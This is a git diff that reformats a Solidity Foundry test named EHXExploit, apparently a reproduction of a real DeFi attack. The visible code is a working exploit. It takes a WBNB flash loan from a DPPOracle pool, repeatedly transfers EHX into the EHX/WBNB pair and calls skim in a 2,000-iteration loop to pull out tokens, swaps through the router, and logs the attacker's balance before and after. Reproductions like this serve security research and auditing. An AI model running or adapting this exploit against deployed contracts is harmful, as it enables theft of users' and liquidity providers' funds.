@@ -40,17 +40,13 @@ contract EHXExploit is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         DPPOracle.flashLoan(flashAmountWBNB, 0, address(this), bytes("_"));
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
     }
 
@@ -60,7 +56,7 @@ contract EHXExploit is Test {
         uint256 amountEHXToTransfer = EHX.balanceOf(address(this)) / (300e6);
         uint256 i;
         // More iterations possible
-        while (i < 2_000) {
+        while (i < 2000) {
             EHX.transfer(address(EHX_WBNB), amountEHXToTransfer);
             EHX_WBNB.skim(address(this));
             ++i;
@@ -75,11 +71,7 @@ contract EHXExploit is Test {
         path[0] = address(WBNB);
         path[1] = address(EHX);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -88,11 +80,7 @@ contract EHXExploit is Test {
         path[0] = address(EHX);
         path[1] = address(WBNB);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            EHX.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            EHX.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 }
